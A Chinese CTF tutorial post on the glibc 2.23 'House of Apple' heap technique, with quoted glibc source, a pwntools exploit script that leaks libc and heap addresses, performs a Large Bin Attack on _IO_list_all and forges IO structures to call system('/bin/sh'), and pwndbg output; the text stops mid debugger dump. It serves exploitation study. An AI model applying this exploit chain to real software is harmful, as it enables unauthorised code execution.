---
layout: post
title: 【pwn4heap】pwn4heap - glibc2.23其十一
categories: pwn4heap
description: 深入解析 glibc2.23 Heap Technique
keywords: CTF, pwn4heap, glibc2.23
---

# pwn4heap - glibc2.23其十一

在CTF竞赛体系中，pwn类题目因其直接关联底层系统安全机制，常被视为核心挑战方向。其中，堆利用技术涉及动态内存管理的复杂交互，是突破现代软件防御体系的关键路径之一。本系列聚焦于glibc 2.23环境下的堆漏洞利用方法，该版本因其广泛存在与典型性，成为相关研究的常见基础。通过系统分析与归纳，本系列整理出约43种利用技术，涵盖从基础结构破坏到高级组合利用的多种场景，旨在为后续学习、教学与实践提供结构化的参考。笔者期望借此推动该领域的技术积累与方法论沉淀，促进安全研究社区的交流与进步。


## 1. glibc2.23

### 1-39 house of apple其六

在glibc 2.24引入对`_IO_FILE_plus`虚表（vtable）的严格验证后，**House of Apple**利用技术存在多种演变路径。其中一种变体，**将堆漏洞提供的任意地址写原语，与glibc内部另一组合法的窄字符文件IO跳转表（`_IO_file_jumps` 或 `_IO_file_jumps_maybe_mmap`）相结合**，并通过伪造`_IO_codecvt`结构，构建一条能够通过vtable校验的完整利用链。此方法的核心在于利用文件同步（sync）路径来触发代码执行。

整个利用过程可以系统地划分为以下三个逻辑阶段：

**第一阶段：建立利用基础——获取任意地址写原语**
首要步骤是利用堆漏洞（如**Large Bin Attack**）获得一次关键的**向任意地址写入可控数据**的能力。此原语的核心用途是劫持全局IO流链表，通常通过向关键全局变量`_IO_list_all`写入一个可控的堆地址来实现，为后续所有操作奠定基础。

**第二阶段：构建恶意环境——伪造IO结构并劫持全局链表**
利用已获得的任意地址写能力，执行以下核心操作以污染IO子系统：
1.  **劫持全局IO链表头**：将管理所有文件流的全局指针`_IO_list_all`，修改为指向在堆上预先构造的伪造`_IO_FILE_plus`结构。
2.  **设置合法虚表以通过范围检查**：**（此技术的核心与绕过关键）** 在该伪造结构中，将其虚表（vtable）指针设置为glibc内部合法的 **`_IO_file_jumps` 或 `_IO_file_jumps_maybe_mmap`** 地址。由于此地址位于libc认可的合法vtable内存区域，因此能通过严格的vtable范围验证。
3.  **布置完整的伪造数据结构链**：精确设置伪造结构中的各个字段，以操控后续的执行逻辑：
    *   设置`_IO_FILE_plus`结构内的`_codecvt`指针指向一个伪造的`_IO_codecvt`结构。**这是整个利用链的最终枢纽**。在该伪造结构中：
        *   将 **`__codecvt_do_out`** 函数指针项设置为目标函数地址（如`system`）。
        *   将 **`__codecvt_destr`** 指针项设置为字符串`“/bin/sh”`，为`system`调用提供参数。
    *   精确设置`_IO_write_base`、`_IO_write_ptr`、`_IO_write_end`等字段，以满足后续IO函数执行路径中的各项条件检查，确保流程不被中断。

**第三阶段：触发利用链——引导文件同步路径执行恶意代码**
最终，当程序因调用`abort()`、`exit()`或触发错误处理（如`malloc_printerr`）而执行`_IO_flush_all_lockp`函数时，该函数会遍历被污染的IO链表。对于链表中伪造的文件流，其`_IO_OVERFLOW`函数指针实际指向`_IO_file_jumps`表中的 **`_IO_new_file_sync`** 函数。

控制流进入`_IO_new_file_sync`后，经过`_IO_do_flush`，最终会调用`_IO_wdo_write`。在该函数的特定执行路径中，为处理宽字符转换，会调用与该流关联的`_codecvt`结构中的函数，即执行 **`(*cc->__codecvt_do_out) (cc, ...)`**。

由于此前已完全控制该`_IO_codecvt`结构，并将`__codecvt_do_out`指针设置为`system`地址，同时将`__codecvt_destr`为`“/bin/sh”`，此调用即等效于执行 **`system(“/bin/sh”)`**，从而成功获取shell，完成任意代码执行。

相关glibc完整源码参见[fileops.c](https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/fileops.c#L874)：

```c
const struct _IO_jump_t _IO_file_jumps =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_file_finish),
  JUMP_INIT(overflow, _IO_file_overflow),
  JUMP_INIT(underflow, _IO_file_underflow),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_default_pbackfail),
  JUMP_INIT(xsputn, _IO_file_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_new_file_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_new_file_setbuf),
  JUMP_INIT(sync, _IO_new_file_sync),
  JUMP_INIT(doallocate, _IO_file_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close),
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
libc_hidden_data_def (_IO_file_jumps)

const struct _IO_jump_t _IO_file_jumps_maybe_mmap =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_file_finish),
  JUMP_INIT(overflow, _IO_file_overflow),
  JUMP_INIT(underflow, _IO_file_underflow_maybe_mmap),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_default_pbackfail),
  JUMP_INIT(xsputn, _IO_new_file_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn_maybe_mmap),
  JUMP_INIT(seekoff, _IO_file_seekoff_maybe_mmap),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, (_IO_setbuf_t) _IO_file_setbuf_mmap),
  JUMP_INIT(sync, _IO_new_file_sync),
  JUMP_INIT(doallocate, _IO_file_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close),
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};

struct _IO_codecvt
{
  void (*__codecvt_destr) (struct _IO_codecvt *);
  enum __codecvt_result (*__codecvt_do_out) (struct _IO_codecvt *,
					     __mbstate_t *,
					     const wchar_t *,
					     const wchar_t *,
					     const wchar_t **, char *,
					     char *, char **);
  enum __codecvt_result (*__codecvt_do_unshift) (struct _IO_codecvt *,
						 __mbstate_t *, char *,
						 char *, char **);
  enum __codecvt_result (*__codecvt_do_in) (struct _IO_codecvt *,
					    __mbstate_t *,
					    const char *, const char *,
					    const char **, wchar_t *,
					    wchar_t *, wchar_t **);
  int (*__codecvt_do_encoding) (struct _IO_codecvt *);
  int (*__codecvt_do_always_noconv) (struct _IO_codecvt *);
  int (*__codecvt_do_length) (struct _IO_codecvt *, __mbstate_t *,
			      const char *, const char *, _IO_size_t);
  int (*__codecvt_do_max_length) (struct _IO_codecvt *);

  _IO_iconv_t __cd_in;
  _IO_iconv_t __cd_out;
};

struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;	/* Current read pointer */
  wchar_t *_IO_read_end;	/* End of get area. */
  wchar_t *_IO_read_base;	/* Start of putback+get area. */
  wchar_t *_IO_write_base;	/* Start of put area. */
  wchar_t *_IO_write_ptr;	/* Current put pointer. */
  wchar_t *_IO_write_end;	/* End of put area. */
  wchar_t *_IO_buf_base;	/* Start of reserve area. */
  wchar_t *_IO_buf_end;		/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;	/* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base;	/* Pointer to first valid character of
				   backup area */
  wchar_t *_IO_save_end;	/* Pointer to end of non-current get area. */

  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;

  wchar_t _shortbuf[1];

  const struct _IO_jump_t *_wide_vtable;
};

int
_IO_new_file_sync (_IO_FILE *fp)
{
  _IO_ssize_t delta;
  int retval = 0;

  /*    char* ptr = cur_ptr(); */
  if (fp->_IO_write_ptr > fp->_IO_write_base)
    if (_IO_do_flush(fp)) return EOF;
  delta = fp->_IO_read_ptr - fp->_IO_read_end;
  if (delta != 0)
    {
#ifdef TODO
      if (_IO_in_backup (fp))
	delta -= eGptr () - Gbase ();
#endif
      _IO_off64_t new_pos = _IO_SYSSEEK (fp, delta, 1);
      if (new_pos != (_IO_off64_t) EOF)
	fp->_IO_read_end = fp->_IO_read_ptr;
#ifdef ESPIPE
      else if (errno == ESPIPE)
	; /* Ignore error from unseekable devices. */
#endif
      else
	retval = EOF;
    }
  if (retval != EOF)
    fp->_offset = _IO_pos_BAD;
  /* FIXME: Cleanup - can this be shared? */
  /*    setg(base(), ptr, ptr); */
  return retval;
}
libc_hidden_ver (_IO_new_file_sync, _IO_file_sync)

#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
# define _IO_do_flush(_f) \
  ((_f)->_mode <= 0							      \
   ? _IO_do_write(_f, (_f)->_IO_write_base,				      \
		  (_f)->_IO_write_ptr-(_f)->_IO_write_base)		      \
   : _IO_wdo_write(_f, (_f)->_wide_data->_IO_write_base,		      \
		   ((_f)->_wide_data->_IO_write_ptr			      \
		    - (_f)->_wide_data->_IO_write_base)))
#else
# define _IO_do_flush(_f) \
  _IO_do_write(_f, (_f)->_IO_write_base,				      \
	       (_f)->_IO_write_ptr-(_f)->_IO_write_base)
#endif

int
_IO_wdo_write (_IO_FILE *fp, const wchar_t *data, _IO_size_t to_do)
{
  struct _IO_codecvt *cc = fp->_codecvt;

  if (to_do > 0)
    {
      if (fp->_IO_write_end == fp->_IO_write_ptr
	  && fp->_IO_write_end != fp->_IO_write_base)
	{
	  if (_IO_new_do_write (fp, fp->_IO_write_base,
				fp->_IO_write_ptr - fp->_IO_write_base) == EOF)
	    return WEOF;
	}

      do
	{
	  enum __codecvt_result result;
	  const wchar_t *new_data;
	  char mb_buf[MB_LEN_MAX];
	  char *write_base, *write_ptr, *buf_end;

	  if (fp->_IO_write_ptr - fp->_IO_write_base < sizeof (mb_buf))
	    {
	      /* Make sure we have room for at least one multibyte
		 character.  */
	      write_ptr = write_base = mb_buf;
	      buf_end = mb_buf + sizeof (mb_buf);
	    }
	  else
	    {
	      write_ptr = fp->_IO_write_ptr;
	      write_base = fp->_IO_write_base;
	      buf_end = fp->_IO_buf_end;
	    }

	  /* Now convert from the internal format into the external buffer.  */
	  result = (*cc->__codecvt_do_out) (cc, &fp->_wide_data->_IO_state,
					    data, data + to_do, &new_data,
					    write_ptr,
					    buf_end,
					    &write_ptr);

	  /* Write out what we produced so far.  */
	  if (_IO_new_do_write (fp, write_base, write_ptr - write_base) == EOF)
	    /* Something went wrong.  */
	    return WEOF;

	  to_do -= new_data - data;

	  /* Next see whether we had problems during the conversion.  If yes,
	     we cannot go on.  */
	  if (result != __codecvt_ok
	      && (result != __codecvt_partial || new_data - data == 0))
	    break;

	  data = new_data;
	}
      while (to_do > 0);
    }

  _IO_wsetg (fp, fp->_wide_data->_IO_buf_base, fp->_wide_data->_IO_buf_base,
	     fp->_wide_data->_IO_buf_base);
  fp->_wide_data->_IO_write_base = fp->_wide_data->_IO_write_ptr
    = fp->_wide_data->_IO_buf_base;
  fp->_wide_data->_IO_write_end = ((fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
				   ? fp->_wide_data->_IO_buf_base
				   : fp->_wide_data->_IO_buf_end);

  return to_do == 0 ? 0 : WEOF;
}
libc_hidden_def (_IO_wdo_write)
```

本方法的成功执行，最终依赖于glibc内部一条确定的、从堆管理器错误处理到文件流同步刷新的完整路径。具体而言，通过触发堆分配器错误（例如双重释放一个已位于large bin中的内存块）来引导程序调用 **`malloc_printerr`** 函数。该函数在准备输出错误信息时，会调用 **`_IO_flush_all_lockp`** 以强制刷新所有已注册的IO流。

`_IO_flush_all_lockp` 函数会遍历由全局指针 `_IO_list_all` 管理的IO链表，并对其中每个文件流调用其虚表（vtable）中定义的 **`_IO_OVERFLOW`** 函数。由于利用链已通过Large Bin Attack将`_IO_list_all`劫持，并插入了一个虚表设置为 **`_IO_file_jumps` 或 `_IO_file_jumps_maybe_mmap`** 的伪造`_IO_FILE_plus`结构，因此实际被调用的`_IO_OVERFLOW`函数即为该表中的 **`_IO_new_file_sync`**。

**关键函数路径与作用分析：**

1.  **`_IO_new_file_sync`函数**：
    *   **作用**：负责执行文件流的同步操作，确保内存中的数据与底层文件（或标准流）状态一致。
    *   **在利用链中的角色**：这是控制流从通用的溢出处理转向文件同步逻辑的入口。它会进一步调用`_IO_do_flush`来执行实际的刷新操作。

2.  **`_IO_do_flush`函数**：
    *   **作用**：一个条件宏，负责执行文件流的底层刷新。
    *   **在利用链中的角色**：作为执行流的一部分，它将调用继续传递到负责实际写入操作的函数，例如`_IO_wdo_write`。

3.  **`_IO_wdo_write`函数**：
    *   **作用**：负责处理宽字符流（wide stream）的实际写入逻辑。
    *   **在利用链中的角色**：这是触发最终代码执行的关键节点。在该函数的执行过程中，当需要处理字符集转换时，会调用关联的`_codecvt`结构中的转换函数。

4.  **`__codecvt_do_out`函数指针**：
    *   **作用**：这是`_IO_codecvt`结构体中的一个标准函数指针，本意是用于执行从内部宽字符到外部多字节序列的转换。
    *   **在利用链中的角色**：**这是整个利用链的最终跳转点**。通过前期布局，已完全控制了伪造的`_IO_codecvt`结构，并将此 **`__codecvt_do_out`** 指针设置为目标函数地址（如`system`）。当`_IO_wdo_write`执行到转换步骤，调用 **`(*cc->__codecvt_do_out) (cc, ...)`** 时，实际调用的是`system`函数。同时，将同一结构中的`__codecvt_destr`指针设置为字符串`“/bin/sh”`，使得`system`调用获得正确的参数，从而成功执行`system(“/bin/sh”)`。

**完整的控制流路径总结**：

因此，从触发堆错误到获取shell的完整控制流路径为：
**`malloc_printerr` → `_IO_flush_all_lockp` → `_IO_OVERFLOW` (`_IO_new_file_sync`) → `_IO_do_flush` → `_IO_wdo_write` → `__codecvt_do_out` (`system`)**。

通过将`_IO_codecvt`结构中的`__codecvt_do_out`函数指针指向预定目标，并将`__codecvt_destr`设置为命令字符串地址，最终将一次复杂的IO流同步刷新操作，转化为了对任意命令的可靠执行。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/14/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_apple_six/exploit.py)。

核心利用代码如下：

```python
# house of apple six
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
malloc(0, 0x420)
malloc(1, 0x500)
malloc(2, 0x400)
delete(0)
malloc(3, 0x500)
content = show(0)
main_arena1096 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+1096: {hex(main_arena1096)}")
libc.address = main_arena1096 - 0x38DF68
log.info(f"libc base: {hex(libc.address)}")
system = libc.sym["system"]
log.info(f"system addr: {hex(system)}")
_IO_file_jumps = libc.sym["_IO_file_jumps"]
log.info(f"_IO_file_jumps addr: {hex(_IO_file_jumps)}")
_IO_list_all = libc.sym["_IO_list_all"]
log.info(f"_IO_list_all addr: {hex(_IO_list_all)}")

payload = b"A" * 0x10 + b"A"
edit(0, len(payload), payload)
content = show(0)
chunk0_addr = u64(content[0x10 : 0x10 + 6].ljust(8, b"\x00")) - ord("A")
log.info(f"chunk0 addr: {hex(chunk0_addr)}")
chunk2_addr = chunk0_addr + 0x420 + 0x10 + 0x500 + 0x10
log.info(f"chunk2 addr: {hex(chunk2_addr)}")

delete(2)
payload = p64(main_arena1096) + p64(_IO_list_all - 0x10)
payload += p64(chunk0_addr) + p64(_IO_list_all - 0x20)
edit(0, len(payload), payload)
malloc(4, 0x500)

fake_wide_data = b"\x00" * 0x18 + p64(2)
fake_wide_data = fake_wide_data.ljust(0x20, b"\x00") + p64(0xFFFFFFFFFFFFFFFF)
payload = b"\x00" * 0x20 + fake_wide_data
fake_codecvt = b"/bin/sh\x00" + p64(system)
payload = payload.ljust(0x200 - 0x10, b"\x00") + fake_codecvt
edit(0, len(payload), payload)

fake_io = p64(0)
fake_io = fake_io.ljust(0x20 - 0x10, b"\x00") + p64(2)
fake_io = fake_io.ljust(0x28 - 0x10, b"\x00") + p64(3)
fake_io = fake_io.ljust(0x30 - 0x10, b"\x00") + p64(4)
fake_io = fake_io.ljust(0x98 - 0x10, b"\x00") + p64(chunk0_addr + 0x200)
fake_io = fake_io.ljust(0xA0 - 0x10, b"\x00") + p64(chunk0_addr + 0x30)
fake_io = fake_io.ljust(0xC0 - 0x10, b"\x00") + p64(1)
fake_io = fake_io.ljust(0xD8 - 0x10, b"\x00") + p64(_IO_file_jumps + 0x48)
edit(2, len(fake_io), fake_io)
delete(0)
conn.recvline()
cmd = b"cat src/2.23/house_of_apple_six/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

在堆漏洞利用的初始阶段，获取目标进程的内存布局信息是至关重要的先决条件。一种经典且高效的技术是引导一个空闲堆块在glibc分配器的不同容器间转移，利用其管理元数据的变化来提取地址。具体而言，通过操纵一个堆块从**unsorted bin**迁移至**large bin**，可以借助large bin特有的指针结构，一次性泄露**libc基址**与**堆内存起始地址**。

**完整的操作步骤与其背后的原理如下：**

1.  **构建初始的堆内存布局**
    首先顺序分配三个堆内存块，分别记为`chunk[0]`、`chunk[1]`和`chunk[2]`。其中`chunk[1]`的核心作用是物理隔离，确保`chunk[0]`与`chunk[2]`在内存中不相邻，从而防止它们在后续操作中发生合并。一个关键的技术要点是设定`chunk[0]`的尺寸大于`chunk[2]`的尺寸，这保证了`chunk[0]`足够大，能够满足后续被large bin收纳的条件（通常指尺寸不小于1024字节）。

2.  **将目标块置入Unsorted Bin以获取libc相关指针**
    接着，释放`chunk[0]`。由于其尺寸超出了fast bin的管理范围，且未与top chunk相邻，它会被置入**unsorted bin**——一个用于临时存放空闲块的双向循环链表。此时，分配器会将`chunk[0]`的`fd`（前向）和`bk`（后向）指针改写，指向glibc全局管理结构`main_arena`内部的某个特定地址（例如`main_arena+88`）。此地址与libc的加载基址之间存在一个已知的固定偏移。

3.  **触发分配以引导块转入Large Bin**
    随后，程序发起一次新的内存分配请求，申请一个尺寸大于`chunk[0]`的新堆块`chunk[3]`。由于unsorted bin中唯一的块`chunk[0]`无法满足此次较大的请求，分配器会对其进行整理。鉴于其较大的尺寸，`chunk[0]`被从unsorted bin中移出，并根据其大小被插入到对应的**large bin**链表中。

4.  **捕获Large Bin中的特殊指针以同时泄露堆地址**
    在large bin链表中，每个空闲块除了维护标准的`fd`和`bk`双向链表指针外，还包含一对特殊的`fd_nextsize`和`bk_nextsize`指针，用于在不同大小的块之间进行快速索引。当`chunk[0]`被放入一个**空的large bin**，或成为该尺寸区间的**首个（或唯一）块**时，其`fd_nextsize`和`bk_nextsize`指针会被初始化为指向其自身的堆内存地址。至此，`chunk[0]`的元数据中同时蕴含了两类关键地址信息：
    *   `fd`与`bk`：指向`main_arena`内部的地址（**与libc基址相关**）。
    *   `fd_nextsize`与`bk_nextsize`：指向`chunk[0]`自身的地址（**即堆内存地址**）。

5.  **读取并解析以获取最终的关键地址**
    最后，通过程序可能存在的读功能（例如`show(0)`）输出`chunk[0]`用户数据区的内容。由于该块当前处于释放状态，其用户数据区起始部分已被上述管理指针覆盖。从输出中可同时解析出：
    *   从`fd`或`bk`的值计算出`main_arena`的地址，减去已知的固定偏移即得到**libc的基址**。
    *   从`fd_nextsize`或`bk_nextsize`的值直接获得**该堆块所在的堆内存地址**。

通过这一系列模拟了正常堆管理行为的精巧操作，在无需任何初始地址信息的情况下，即可同时获取后续利用链所依赖的两个基石：libc基址和堆内存布局。这为紧接着实施关键的**Large Bin Attack**以劫持全局数据结构，奠定了不可或缺的基础。

```bash
pwndbg> heap
Free chunk (largebins) | PREV_INUSE
Addr: 0x57cfa21e6000
Size: 0x430 (with flag bits: 0x431)
fd: 0x7fb02e78df68
bk: 0x7fb02e78df68
fd_nextsize: 0x57cfa21e6000
bk_nextsize: 0x57cfa21e6000

Allocated chunk
Addr: 0x57cfa21e6430
Size: 0x510 (with flag bits: 0x510)

Allocated chunk | PREV_INUSE
Addr: 0x57cfa21e6940
Size: 0x410 (with flag bits: 0x411)

Allocated chunk | PREV_INUSE
Addr: 0x57cfa21e6d50
Size: 0x510 (with flag bits: 0x511)

Top chunk | PREV_INUSE
Addr: 0x57cfa21e7260
Size: 0x1fda0 (with flag bits: 0x1fda1)

pwndbg> largebins 
largebins
0x400-0x430: 0x57cfa21e6000 —▸ 0x7fb02e78df68 (main_arena+1096) ◂— 0x57cfa21e6000
pwndbg>
```

在成功获取关键的libc与堆内存地址后，利用流程进入实质性的**主动构造阶段**。接下来，将利用**Large Bin Attack**这一强大原语，在一次堆分配操作中实现 **两次独立的任意地址写**，从而将获取到的地址信息转化为对关键内存的实质性污染，为后续利用链铺平道路。

**具体的利用步骤与原理如下：**

1.  **准备利用载体**：首先释放预留的`chunk[2]`。由于其尺寸适中，它将被置入**unsorted bin**，作为后续链表操作中将被转移的“受害者”块（victim），承载着写入目标地址的数据。

2.  **篡改Large Bin的元数据指针**：利用已掌握的堆上任意写能力，精准修改仍位于**large bin**中的`chunk[0]`的两个关键后向指针：
    *   将`chunk[0]`的`bk`指针修改为`_IO_list_all - 0x10`，旨在劫持全局IO流链表头。
    *   将`chunk[0]`的`bk_nextsize`指针修改为`target2`（例如`_IO_list_all - 0x20`或`global_max_fast`），用于向第二个选定的目标地址写入。

3.  **通过内存分配触发双重写入**：程序申请一个较大的新堆块`chunk[4]`，其大小必须**同时大于`chunk[2]`和`chunk[0]`的尺寸**。此条件迫使分配器无法直接满足请求，必须对unsorted bin进行整理。

    在整理过程中，分配器会将`chunk[2]`（victim）从unsorted bin中取出，并依据其大小尝试插入`chunk[0]`所在的large bin链表。**正是这个插入操作，触发了分配器执行两次关键的链表维护写操作**：
    *   **第一次写入（劫持`_IO_list_all`）**：执行链表操作`victim->bk->fd = victim`。由于`victim->bk`已被篡改为`_IO_list_all - 0x10`，此操作的实际效果是向 **`*_IO_list_all`** 写入`victim`（即`chunk[2]`）的堆地址。
    *   **第二次写入（污染辅助目标）**：执行链表操作`victim->bk_nextsize->fd_nextsize = victim`。由于`victim->bk_nextsize`指向`target2`，此操作向 **`*(target2 + 0x20)`** 写入了`victim`的堆地址。

**利用达成的双重效果**：
至此，一次精心布局的Large Bin Attack成功实现了两个层面的控制：
1.  **核心劫持**：全局IO链表头指针`_IO_list_all`被劫持，指向了可控的堆内存（`chunk[2]`）。这使得后续利用可以完全控制IO链表的遍历起点，为伪造恶意`_IO_FILE`结构并最终劫持控制流创造了决定性条件。
2.  **辅助破坏**：在第二个可控目标地址（`target2 + 0x20`）植入了一个堆地址。通过灵活选择`target2`（例如设为`global_max_fast`），可以扰乱堆分配器的行为，为整个利用链提供额外的操作空间或破坏能力。

此步骤标志着利用从被动的信息收集与验证阶段，正式迈入了主动篡改关键全局数据结构、构建恶意执行环境的实质性利用阶段。

```bash
pwndbg> x/1gx &_IO_list_all
0x7fb02e78e540 <__GI__IO_list_all>:     0x000057cfa21e6940
pwndbg> x/10gx chunks
0x57cf87fa1060 <chunks>:        0x0000000000000020      0x000057cfa21e6010
0x57cf87fa1070 <chunks+16>:     0x0000000000000500      0x000057cfa21e6440
0x57cf87fa1080 <chunks+32>:     0x0000000000000400      0x000057cfa21e6950
0x57cf87fa1090 <chunks+48>:     0x0000000000000500      0x000057cfa21e6d60
0x57cf87fa10a0 <chunks+64>:     0x0000000000000500      0x000057cfa21e7270
pwndbg> 
```

在成功将全局指针`_IO_list_all`劫持为指向`chunk[2]`的堆地址后，利用进入最关键的**数据结构伪造阶段**。此时，需要在`chunk[2]`的内存中精心构造一个伪造的`_IO_FILE_plus`结构。该结构各字段的精确设置旨在引导IO处理流程穿越层层检查，最终抵达预设的利用代码。

**各核心字段的伪造策略、目的与作用如下：**

1.  **设置`_IO_write_ptr`与`_IO_write_base`以触发刷新路径**：
    *   将`_IO_write_ptr`设为`3`，`_IO_write_base`设为`2`。
    *   **核心目的**：此设置旨在满足 **`_IO_new_file_sync`**函数中的关键条件`if (fp->_IO_write_ptr > fp->_IO_write_base)`。当此条件成立时，该文件流被识别为输出缓冲区有待刷新，从而触发对其`_IO_do_flush`的调用。

2.  **设置`_mode`字段以选择宽字符处理路径**：
    *   将`_mode`字段明确设置为`1`。
    *   **核心目的**：`_IO_do_flush`是一个宏，它会根据`_mode`的值选择后续执行函数。当`_mode > 0`时，表示这是一个面向宽字符的流，该宏将展开为对 **`_IO_wdo_write`**函数的调用。这是我们预设的利用路径的关键分支点，确保执行流进入处理宽字符的代码区域，为后续利用`_codecvt`结构创造条件。

3.  **设置`_IO_write_end`以绕过提前返回检查**：
    *   将`_IO_write_end`字段设置为`4`。
    *   **核心目的**：在`_IO_wdo_write`函数的执行路径中，存在一个检查：`if (fp->_IO_write_end == fp->_IO_write_ptr && fp->_IO_write_end != fp->_IO_write_base)`。此检查旨在判断缓冲区是否已满但非空，若成立可能导致提前返回。通过将`_IO_write_end`设为与`_IO_write_ptr`（3）不同的值（4），我们**确保此条件不成立**，从而阻止执行流在此处提前退出，迫使其继续深入执行。

**最终结果**：通过以上字段的精确配合，控制流被成功地从一个简单的缓冲区存在性检查，引导至`_IO_wdo_write`函数内部。在该函数的后续执行逻辑中，当需要处理宽字符转换时，会调用与该文件流关联的`_codecvt`结构中的转换函数，即 **`(*cc->__codecvt_do_out) (cc, ...)`**。由于此前已完全控制该`_IO_codecvt`结构，并将`__codecvt_do_out`指针设置为目标函数（如`system`），此调用即实现了任意代码执行。

```bash
pwndbg> p/x *(struct _IO_FILE_plus*)_IO_list_all
$1 = {
  file = {
    _flags = 0x0,
    _IO_read_ptr = 0x411,
    _IO_read_end = 0x0,
    _IO_read_base = 0x0,
    _IO_write_base = 0x2,
    _IO_write_ptr = 0x3,
    _IO_write_end = 0x4,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0x0,
    _flags2 = 0x0,
    _old_offset = 0x0,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = {0x0},
    _lock = 0x0,
    _offset = 0x0,
    _codecvt = 0x57cfa21e6200,
    _wide_data = 0x57cfa21e6030,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0x0,
    _mode = 0x1,
    _unused2 = {0x0 <repeats 20 times>}
  },
  vtable = 0x7fb02e78c728
}
pwndbg> p/x *(struct _IO_jump_t*)0x7fb02e78c728
$2 = {
  __dummy = 0x7fb02e46b432,
  __dummy2 = 0x7fb02e46d997,
  __finish = 0x7fb02e46b2db,
  __overflow = 0x7fb02e46b221,
  __underflow = 0x7fb02e4608d1,
  __uflow = 0x7fb02e46bbf9,
  __pbackfail = 0x7fb02e46bc56,
  __xsputn = 0x7fb02e46b9c0,
  __xsgetn = 0x7fb02e46b1f5,
  __seekoff = 0x7fb02e46bc3d,
  __seekpos = 0x7fb02e46e485,
  __setbuf = 0x7fb02e46e48b,
  __sync = 0x0,
  __doallocate = 0x0,
  __read = 0x0,
  __write = 0x0,
  __seek = 0x0,
  __close = 0x7fb02e46e919,
  __stat = 0x7fb02e46e5c7,
  __showmanyc = 0x7fb02e46e585,
  __imbue = 0x7fb02e46d76a
}
pwndbg> p/x &_IO_new_file_sync
$3 = 0x7fb02e46b221
pwndbg> 
```

在可控的堆内存区域（例如`chunk0_addr + 0x30`），需要为已伪造的`_IO_FILE_plus`结构精心构造其关联的 **`_IO_wide_data`** 结构。其中， **`_IO_write_base`** 和 **`_IO_write_ptr`** 两个字段的设定尤为关键，旨在精准操控`_IO_flush_all_lockp`函数的内部逻辑。

**具体设置与利用逻辑如下：**

*   **字段设置**：将`_IO_write_base`设为`2`，将`_IO_write_ptr`设为一个极大的值，例如`0xffffffffffffffff`。
*   **利用目的**：此设置旨在满足 **`_IO_flush_all_lockp`** 函数中一个复杂的复合条件判断，该判断决定了是否调用文件流的`_IO_OVERFLOW`函数。条件如下：
    `if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base) || (_IO_vtable_offset (fp) == 0 && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)) ...)`

**利用路径分析**：
1.  **利用`_mode`引导分支**：此前，我们已在伪造的`_IO_FILE_plus`结构中将`_mode`字段设置为`1`（`>0`）。这使得上述条件中的第一个子句`(fp->_mode <= 0 && ...)`**不成立**，从而迫使执行流评估第二个子句。
2.  **满足宽字符流写入条件**：第二个子句的关键部分是`fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)`。由于`_mode=1`，且我们已将`_wide_data->_IO_write_ptr`（`0xffffffffffffffff`）设置为远大于`_wide_data->_IO_write_base`（`2`），因此该子条件**明确成立**。
3.  **触发目标函数调用**：当`_IO_flush_all_lockp`函数确认此条件成立后，便会认为该伪造的宽字符文件流有待刷新的输出数据，从而通过其虚表调用`_IO_OVERFLOW`函数。

**最终结果**：由于该伪造结构的虚表指针被设置为`_IO_file_jumps`，对`_IO_OVERFLOW`的调用实际执行的是该表中的 **`_IO_new_file_sync`** 函数。至此，通过对`_IO_wide_data`结构中两个指针值的精心构造，成功地将控制流从通用的链表遍历函数，精准地导入了预设的、以文件同步操作为起点的复杂利用链。

```bash
pwndbg> p/x *(struct _IO_wide_data*)0x57cfa21e6030
$4 = {
  _IO_read_ptr = 0x0,
  _IO_read_end = 0x0,
  _IO_read_base = 0x0,
  _IO_write_base = 0x2,
  _IO_write_ptr = 0xffffffffffffffff,
  _IO_write_end = 0x0,
  _IO_buf_base = 0x0,
  _IO_buf_end = 0x0,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
